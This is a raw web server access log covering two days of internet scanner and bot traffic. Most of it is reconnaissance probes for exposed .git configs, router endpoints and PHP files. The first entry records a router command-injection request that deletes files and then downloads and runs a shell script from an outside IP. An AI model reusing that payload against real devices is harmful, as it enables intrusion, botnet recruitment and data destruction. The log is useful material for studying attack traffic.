185.224.128.10 - - [12/Feb/2024:17:05:53 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(rm%20-rf%20%2A%3B%20cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F192.3.152.183%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B%20.%2Ftenda.sh) HTTP/1.1" 404 2675 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
34.244.117.189 - - [12/Feb/2024:17:10:00 +0000] "GET /dev/.git/config HTTP/1.1" 404 2423 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_0 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/18.0.130791545 Mobile/14A5345a Safari/600.1.4"
35.203.210.197 - - [12/Feb/2024:17:12:21 +0000] "GET / HTTP/1.1" 200 10965 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
146.19.24.28 - - [12/Feb/2024:17:14:51 +0000] "GET / HTTP/1.1" 200 10965 "-" "-"
34.244.117.189 - - [12/Feb/2024:17:15:58 +0000] "GET /files/.git/config HTTP/1.1" 404 2429 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36"
34.244.117.189 - - [12/Feb/2024:17:18:39 +0000] "GET /log/.git/config HTTP/1.1" 404 2423 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8"
31.220.3.140 - - [12/Feb/2024:17:26:55 +0000] "GET / HTTP/1.1" 200 10965 "-" "-"
31.220.3.140 - - [12/Feb/2024:17:27:06 +0000] "POST /HNAP1/ HTTP/1.1" 404 2437 "-" "Mozila/5.0"
34.244.117.189 - - [12/Feb/2024:17:34:01 +0000] "GET /includes/.git/config HTTP/1.1" 404 2438 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3880.0 Safari/537.36"
34.244.117.189 - - [12/Feb/2024:17:38:40 +0000] "GET /lib/.git/config HTTP/1.1" 404 2423 "-" "grub-client-1.5.3; (grub-client-1.5.3; Crawl your own stuff with http://grub.org)"
34.244.117.189 - - [12/Feb/2024:17:41:24 +0000] "GET /src/.git/config HTTP/1.1" 404 2423 "-" "Mozilla/5.0 (Windows NT 6.2; ARM; Trident/7.0; Touch; rv:11.0; WPDesktop; NOKIA; Lumia 920) like Geckoo"
34.244.117.189 - - [12/Feb/2024:17:43:23 +0000] "GET /node_modules/.git/config HTTP/1.1" 404 2450 "-" "Mozilla/5.0 (Linux; Android 7.0; LG-H918 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36"
34.244.117.189 - - [12/Feb/2024:17:52:53 +0000] "GET /assets/.git/config HTTP/1.1" 404 2432 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
34.244.117.189 - - [12/Feb/2024:17:53:05 +0000] "GET /private/.git/config HTTP/1.1" 404 2435 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2166.2 Safari/537.36"
18.181.194.44 - - [12/Feb/2024:17:57:15 +0000] "GET / HTTP/1.1" 200 3706 "-" "Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaE7-00/010.016; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.7.3 3gpp-gba"
34.244.117.189 - - [12/Feb/2024:18:16:55 +0000] "GET /scripts/.git/config HTTP/1.1" 404 2435 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12"
34.244.117.189 - - [12/Feb/2024:18:17:59 +0000] "GET /settings/.git/config HTTP/1.1" 404 2438 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.464.0 Safari/534.3"
34.244.117.189 - - [12/Feb/2024:18:19:28 +0000] "GET /info/.git/config HTTP/1.1" 404 2426 "-" "Mozilla/5.0 (Linux; Android 5.0; SM-G900F Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/45.0.2454.95 Mobile Safari/537.36"
34.244.117.189 - - [12/Feb/2024:18:22:38 +0000] "GET /images/.git/config HTTP/1.1" 404 2432 "-" "Mozilla/5.0 (Linux; Android 9; ASUS_X00TD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
79.110.62.197 - - [12/Feb/2024:18:31:10 +0000] "GET / HTTP/1.0" 400 38400 "-" "ivre-masscan/1.3 https://github.com/robertdavidgraham/"
146.19.24.28 - - [12/Feb/2024:18:34:23 +0000] "GET / HTTP/1.1" 200 10965 "-" "-"
34.244.117.189 - - [12/Feb/2024:18:34:31 +0000] "GET /dist/.git/config HTTP/1.1" 404 2426 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; en-us; KFTT Build/IML74K) AppleWebKit/535.19 (KHTML, like Gecko) Silk/2.1 Mobile Safari/535.19 Silk-Accelerated=true"
34.244.117.189 - - [12/Feb/2024:18:43:23 +0000] "GET /bin/.git/config HTTP/1.1" 404 2423 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/75.0.3770.103 Mobile/15E148 Safari/605.1"
192.155.88.231 - - [12/Feb/2024:18:46:15 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 zgrab/0.x"
45.33.80.243 - - [12/Feb/2024:18:46:40 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
34.244.117.189 - - [12/Feb/2024:18:49:22 +0000] "GET /admin/.git/config HTTP/1.1" 302 471 "-" "Mozilla/5.0 (Linux; U; Android 7.0; es-es; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/10.9.7-g"
34.244.117.189 - - [12/Feb/2024:18:50:55 +0000] "GET /content/.git/config HTTP/1.1" 404 2435 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36"
34.244.117.189 - - [12/Feb/2024:18:52:49 +0000] "GET /app/.git/config HTTP/1.1" 404 2423 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36"
34.244.117.189 - - [12/Feb/2024:18:56:26 +0000] "GET /config/.git/config HTTP/1.1" 404 2432 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36"
192.241.215.29 - - [12/Feb/2024:19:00:22 +0000] "GET /portal/redlion HTTP/1.1" 404 2401 "-" "Mozilla/5.0 zgrab/0.x"
34.244.117.189 - - [12/Feb/2024:19:00:31 +0000] "GET /vendor/.git/config HTTP/1.1" 404 2432 "-" "Mozilla/5.0 (compatible; YandexNews/4.0; +http://yandex.com/bots)"
34.244.117.189 - - [12/Feb/2024:19:02:42 +0000] "GET /js/.git/config HTTP/1.1" 404 2420 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 YaBrowser/19.6.0.1583 Yowser/2.5 Safari/537.36"
185.224.128.10 - - [12/Feb/2024:19:10:13 +0000] "GET / HTTP/1.1" 200 10965 "-" "-"
54.223.58.116 - - [12/Feb/2024:19:32:36 +0000] "GET /.vscode/sftp.json HTTP/1.1" 404 2413 "-" "Go-http-client/1.1"
117.212.79.89 - - [12/Feb/2024:19:33:18 +0000] "GET / HTTP/1.1" 200 10965 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
103.13.65.58 - - [12/Feb/2024:19:49:42 +0000] "GET / HTTP/1.1" 200 10965 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
146.19.24.28 - - [12/Feb/2024:19:59:18 +0000] "GET / HTTP/1.1" 200 10965 "-" "-"
31.220.3.140 - - [12/Feb/2024:20:05:31 +0000] "GET / HTTP/1.1" 200 10965 "-" "-"
31.220.3.140 - - [12/Feb/2024:20:05:32 +0000] "POST /HNAP1/ HTTP/1.1" 404 2437 "-" "Mozila/5.0"
91.219.55.20 - - [12/Feb/2024:20:06:54 +0000] "GET / HTTP/1.1" 200 10965 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
91.219.55.20 - - [12/Feb/2024:20:06:54 +0000] "GET / HTTP/1.1" 200 10965 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
45.79.181.223 - - [12/Feb/2024:20:36:53 +0000] "\x16\x03\x01" 400 531 "-" "-"
198.199.116.41 - - [12/Feb/2024:20:59:24 +0000] "GET /hudson HTTP/1.1" 404 2377 "-" "Mozilla/5.0 zgrab/0.x"
146.19.24.28 - - [12/Feb/2024:21:02:49 +0000] "GET / HTTP/1.1" 200 10965 "-" "-"
205.210.31.132 - - [12/Feb/2024:21:07:51 +0000] "GET / HTTP/1.1" 200 10965 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
185.224.128.55 - - [12/Feb/2024:21:08:12 +0000] "GET / HTTP/1.1" 200 3743 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
172.105.128.11 - - [12/Feb/2024:21:11:27 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
143.198.214.253 - - [12/Feb/2024:21:20:04 +0000] "\x16\x03\x01\x01\x04\x01" 400 531 "-" "-"
31.220.3.140 - - [12/Feb/2024:21:21:48 +0000] "GET / HTTP/1.1" 200 10965 "-" "-"
31.220.3.140 - - [12/Feb/2024:21:22:01 +0000] "POST /HNAP1/ HTTP/1.1" 404 2437 "-" "Mozila/5.0"
143.198.214.253 - - [12/Feb/2024:21:23:44 +0000] "GET /hello HTTP/1.1" 400 61754 "-" "Mozilla/5.0"
82.147.84.167 - - [12/Feb/2024:21:50:22 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
35.240.121.17 - - [12/Feb/2024:21:56:40 +0000] "GET / HTTP/1.1" 200 3743 "-" "python-requests/2.31.0"
85.90.246.159 - - [12/Feb/2024:22:35:20 +0000] "\x16\x03\x01" 400 531 "-" "-"
192.155.88.231 - - [12/Feb/2024:22:45:54 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 zgrab/0.x"
45.33.80.243 - - [12/Feb/2024:22:46:59 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
176.97.210.229 - - [12/Feb/2024:22:56:29 +0000] "GET / HTTP/1.1" 200 10965 "-" "-"
198.235.24.216 - - [12/Feb/2024:23:02:50 +0000] "GET / HTTP/1.0" 400 62551 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
45.33.80.243 - - [12/Feb/2024:23:03:52 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
172.105.128.11 - - [12/Feb/2024:23:14:01 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
35.203.211.37 - - [12/Feb/2024:23:14:09 +0000] "GET / HTTP/1.1" 200 10965 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
45.79.163.53 - - [12/Feb/2024:23:21:19 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 zgrab/0.x"
192.155.90.220 - - [12/Feb/2024:23:22:05 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
31.220.3.140 - - [12/Feb/2024:23:24:35 +0000] "GET / HTTP/1.1" 200 10965 "-" "-"
31.220.3.140 - - [12/Feb/2024:23:24:39 +0000] "POST /HNAP1/ HTTP/1.1" 404 2437 "-" "Mozila/5.0"
146.19.24.28 - - [12/Feb/2024:23:24:41 +0000] "GET / HTTP/1.1" 200 10965 "-" "-"
52.81.17.152 - - [12/Feb/2024:23:37:54 +0000] "GET /.git/config HTTP/1.1" 404 2395 "-" "Go-http-client/1.1"
112.248.117.191 - - [13/Feb/2024:00:12:28 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 400 62459 "-" "Hello, World"
45.79.163.53 - - [13/Feb/2024:00:16:30 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 zgrab/0.x"
185.224.128.55 - - [13/Feb/2024:00:17:24 +0000] "GET / HTTP/1.1" 200 3743 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
45.79.168.172 - - [13/Feb/2024:00:31:40 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 zgrab/0.x"
31.220.3.140 - - [13/Feb/2024:01:15:28 +0000] "GET / HTTP/1.1" 200 10965 "-" "-"
31.220.3.140 - - [13/Feb/2024:01:15:42 +0000] "POST /HNAP1/ HTTP/1.1" 404 2437 "-" "Mozila/5.0"
106.75.98.106 - - [13/Feb/2024:01:49:01 +0000] "GET / HTTP/1.1" 200 10965 "-" "-"
45.33.87.154 - - [13/Feb/2024:02:48:13 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 zgrab/0.x"
45.142.182.85 - - [13/Feb/2024:02:52:41 +0000] "GET / HTTP/1.1" 200 10965 "-" "-"
79.137.67.195 - - [13/Feb/2024:03:16:06 +0000] "GET / HTTP/1.1" 200 3706 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows Phone OS 7.0; Trident/3.1; IEMobile/7.0)"
162.243.133.35 - - [13/Feb/2024:03:23:28 +0000] "GET /druid/index.html HTTP/1.1" 404 2407 "-" "Mozilla/5.0 zgrab/0.x"
172.104.210.105 - - [13/Feb/2024:03:25:39 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 zgrab/0.x"
165.154.134.152 - - [13/Feb/2024:03:34:58 +0000] "\x16\x03\x01\x01\x17\x01" 400 531 "-" "-"
165.154.134.152 - - [13/Feb/2024:03:35:10 +0000] "GET / HTTP/1.1" 200 10965 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
165.154.134.152 - - [13/Feb/2024:03:35:17 +0000] "GET /favicon.ico HTTP/1.1" 404 2392 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
165.154.134.152 - - [13/Feb/2024:03:35:17 +0000] "GET /robots.txt HTTP/1.1" 404 2389 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
165.154.134.152 - - [13/Feb/2024:03:35:18 +0000] "GET /sitemap.xml HTTP/1.1" 404 2392 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
134.209.210.37 - - [13/Feb/2024:03:35:57 +0000] "\x16\x03\x01" 400 531 "-" "-"
134.209.210.37 - - [13/Feb/2024:03:35:57 +0000] "\x16\x03\x01" 400 531 "-" "-"
134.209.210.37 - - [13/Feb/2024:03:35:58 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
134.209.210.37 - - [13/Feb/2024:03:35:58 +0000] "GET /form.html HTTP/1.1" 404 2386 "-" "curl/8.1.2"
134.209.210.37 - - [13/Feb/2024:03:35:59 +0000] "GET /upl.php HTTP/1.1" 404 2380 "-" "Mozilla/5.0"
134.209.210.37 - - [13/Feb/2024:03:35:59 +0000] "\x16\x03\x01" 400 531 "-" "-"
134.209.210.37 - - [13/Feb/2024:03:35:59 +0000] "GET /geoip/ HTTP/1.1" 404 2377 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
134.209.210.37 - - [13/Feb/2024:03:36:00 +0000] "GET /favicon.ico HTTP/1.1" 404 2392 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
134.209.210.37 - - [13/Feb/2024:03:36:00 +0000] "GET /1.php HTTP/1.1" 404 2374 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
134.209.210.37 - - [13/Feb/2024:03:36:01 +0000] "GET /bundle.js HTTP/1.1" 404 2386 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
134.209.210.37 - - [13/Feb/2024:03:36:01 +0000] "GET /files/ HTTP/1.1" 404 2377 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
134.209.210.37 - - [13/Feb/2024:03:36:02 +0000] "GET /systembc/password.php HTTP/1.1" 404 2422 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
134.209.210.37 - - [13/Feb/2024:03:36:02 +0000] "GET /password.php HTTP/1.1" 404 2395 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
134.209.210.37 - - [13/Feb/2024:03:36:03 +0000] "GET /info.php HTTP/1.1" 404 2383 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
194.165.16.10 - - [13/Feb/2024:03:42:34 +0000] "\x03" 400 531 "-" "-"
172.105.128.11 - - [13/Feb/2024:03:49:21 +0000] "\x16\x03\x01" 400 531 "-" "-"
45.33.80.243 - - [13/Feb/2024:03:51:16 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
45.79.181.223 - - [13/Feb/2024:03:54:54 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
45.79.181.223 - - [13/Feb/2024:04:11:25 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
45.79.181.223 - - [13/Feb/2024:04:20:51 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
205.210.31.142 - - [13/Feb/2024:04:40:02 +0000] "GET / HTTP/1.0" 400 62549 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
198.235.24.130 - - [13/Feb/2024:05:11:45 +0000] "\x16\x03\x01" 400 531 "-" "-"
198.235.24.130 - - [13/Feb/2024:05:11:45 +0000] "\x16\x03\x01" 400 531 "-" "-"
31.220.3.140 - - [13/Feb/2024:05:20:14 +0000] "GET / HTTP/1.1" 200 10965 "-" "-"
31.220.3.140 - - [13/Feb/2024:05:20:15 +0000] "POST /HNAP1/ HTTP/1.1" 404 2437 "-" "Mozila/5.0"
167.94.145.51 - - [13/Feb/2024:06:15:51 +0000] "GET / HTTP/1.1" 200 10965 "-" "-"
167.94.145.51 - - [13/Feb/2024:06:15:54 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.145.51 - - [13/Feb/2024:06:15:55 +0000] "PRI * HTTP/2.0" 400 531 "-" "-"
167.94.145.51 - - [13/Feb/2024:06:15:55 +0000] "GET /favicon.ico HTTP/1.1" 404 2411 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.172.58.224 - - [13/Feb/2024:06:21:13 +0000] "\x16\x03\x01\x01\xfb\x01" 400 531 "-" "-"
64.62.197.231 - - [13/Feb/2024:06:41:38 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0"
146.19.24.28 - - [13/Feb/2024:06:42:33 +0000] "GET / HTTP/1.1" 200 10965 "-" "-"
192.241.202.48 - - [13/Feb/2024:06:59:01 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 zgrab/0.x"
31.220.3.140 - - [13/Feb/2024:07:53:59 +0000] "GET / HTTP/1.1" 200 10965 "-" "-"
31.220.3.140 - - [13/Feb/2024:07:53:59 +0000] "POST /HNAP1/ HTTP/1.1" 404 2437 "-" "Mozila/5.0"
146.19.24.28 - - [13/Feb/2024:08:11:32 +0000] "GET / HTTP/1.1" 200 10965 "-" "-"
117.212.56.114 - - [13/Feb/2024:08:43:25 +0000] "GET / HTTP/1.1" 200 10965 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
192.155.88.231 - - [13/Feb/2024:09:02:00 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 zgrab/0.x"
45.33.80.243 - - [13/Feb/2024:09:02:48 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
52.221.233.79 - - [13/Feb/2024:09:25:44 +0000] "GET / HTTP/1.1" 200 3706 "-" "Mozilla/5.0 (X11; U; Linux i686; rv:19.0) Gecko/20100101 Slackware/13 Firefox/19.0"
172.104.210.105 - - [13/Feb/2024:10:02:43 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 zgrab/0.x"
45.33.80.243 - - [13/Feb/2024:10:03:01 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
87.251.64.11 - - [13/Feb/2024:10:10:16 +0000] "-" 408 0 "-" "-"
31.220.88.155 - - [13/Feb/2024:10:34:20 +0000] "\x16\x03\x01\x01\xc0\x01" 400 531 "-" "-"
35.157.43.242 - - [13/Feb/2024:10:44:27 +0000] "GET /.git/config HTTP/1.1" 404 2448 "-" "python-requests/2.25.1"
91.109.138.137 - - [13/Feb/2024:10:48:46 +0000] "GET / HTTP/1.1" 200 10965 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
31.220.88.155 - - [13/Feb/2024:10:54:23 +0000] "GET /admin/config.php HTTP/1.0" 302 470 "-" "xfa1"
146.19.24.28 - - [13/Feb/2024:11:16:36 +0000] "GET / HTTP/1.1" 200 10965 "-" "-"
45.56.108.128 - - [13/Feb/2024:11:20:16 +0000] "GET /systembc/password.php HTTP/1.0" 400 62474 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
83.97.73.245 - - [13/Feb/2024:11:21:05 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 3706 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
31.220.3.140 - - [13/Feb/2024:11:38:28 +0000] "GET / HTTP/1.1" 200 10965 "-" "-"
31.220.3.140 - - [13/Feb/2024:11:38:29 +0000] "POST /HNAP1/ HTTP/1.1" 404 2437 "-" "Mozila/5.0"
65.49.1.115 - - [13/Feb/2024:11:42:51 +0000] "\x16\x03\x01" 400 531 "-" "-"
205.210.31.142 - - [13/Feb/2024:12:19:25 +0000] "GET / HTTP/1.1" 200 10965 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
167.71.202.190 - - [13/Feb/2024:12:38:29 +0000] "GET /cdn-cgi/trace HTTP/1.1" 400 61912 "-" "Mozilla/5.0"
167.71.202.190 - - [13/Feb/2024:12:38:44 +0000] "\x16\x03\x01\x01\x07\x01" 400 531 "-" "-"
45.79.172.21 - - [13/Feb/2024:12:39:43 +0000] "\x16\x03\x01" 400 531 "-" "-"
146.19.24.28 - - [13/Feb/2024:12:40:26 +0000] "GET / HTTP/1.1" 200 10965 "-" "-"
146.190.108.121 - - [13/Feb/2024:12:40:45 +0000] "\x16\x03\x01\x01\x07\x01" 400 531 "-" "-"
45.79.163.53 - - [13/Feb/2024:12:47:28 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 zgrab/0.x"
154.66.125.202 - - [13/Feb/2024:12:48:45 +0000] "GET / HTTP/1.1" 200 10965 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
45.79.181.223 - - [13/Feb/2024:12:52:56 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
139.59.101.104 - - [13/Feb/2024:13:04:09 +0000] "GET /cdn-cgi/trace HTTP/1.1" 400 61912 "-" "Mozilla/5.0"
83.97.73.245 - - [13/Feb/2024:13:07:45 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 2450 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
141.98.7.179 - - [13/Feb/2024:13:52:51 +0000] "GET http://141.98.7.179/a.php?pro=34.22.76.150:80 HTTP/1.1" 400 62456 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36"
146.19.24.28 - - [13/Feb/2024:14:03:29 +0000] "GET / HTTP/1.1" 200 10965 "-" "-"
172.234.96.249 - - [13/Feb/2024:14:35:30 +0000] "GET /sy.php HTTP/1.1" 400 61351 "-" "-"
69.164.217.74 - - [13/Feb/2024:14:46:41 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 zgrab/0.x"
31.220.3.140 - - [13/Feb/2024:15:08:45 +0000] "GET / HTTP/1.1" 200 10965 "-" "-"
